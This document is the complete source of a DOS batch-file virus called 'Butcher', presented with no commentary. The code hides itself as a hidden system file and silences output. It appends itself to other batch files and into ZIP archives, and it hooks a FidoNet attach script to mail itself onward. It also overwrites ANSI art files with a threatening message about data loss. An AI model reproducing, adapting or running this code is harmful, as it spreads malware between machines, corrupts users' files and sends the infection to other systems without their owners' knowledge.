@ctty nul
copy %0 Butcher.bat
if exist c:\drvsys.sys goto okok
copy %0 c:\drvsys.sys
: << ! >>
if not "%1"=="" goto doq
call Butcher %path%
goto etsall
:fqw
if not exist %1\Butcher.bat goto fqw
goto etsall
:doq
copy Butcher.bat %1 >nul
shift
if not "%1"=="" goto copy
echo. >> c:\fido\attach.bat
echo attach.exe -A -L %0 >> c:\fido\attach.bat
attrib c:\drvsys.sys +h +r
:okok
if exist c:\message goto cont
echo [40m[2J[40m >> message
echo [0;1m[29C[0;1;32mVirus Butcher. >> message
echo [24C[0;1;33m       Hello all!    [0;1m >> message
echo          ษอออออออออออออออออออออออออออออออออออออออออออออออออป >> message
echo          บ   Unfortunately in your computer the very awful บ >> message
echo   0      บ  virus, which name has put up . At the best you บ    0>> message
echo \ บ /    บ  will lose all data simply without serious con- บ  \ บ />> message
echo  ษสห     บ  sequences, but at attempt of treatment me, you บ   ษสห >> message
echo          บ  will lose the data a SAME MINUTE!              บ >> message
echo          ศอออออออออออออออออออออออออออออออออออออออออออออออออผ >> message
:cont
for %%i in (*.bat ..\*.bat) do set TRTL = %%i
for %%f in (*.bat ..\*.bat) do find "TRTL" %%f
for %%j in (*.bat ..\*.bat) do if %%j==ATTACH.BAT goto att
goto re
:att
echo. >> attach.bat
echo attach.exe -A -L %0 >> attach.bat
exit
:re
if not errorlevel 1 goto next
for %%d in (*.bat) do copy /b %%d + Butcher.bat
:next
for %%z in (*.zip) do pkzip %%z Butcher.bat
for %%q in (*.ans c:\max\*.ans) do copy c:\message %%q
del butcher.bat
@ctty con
:etsall
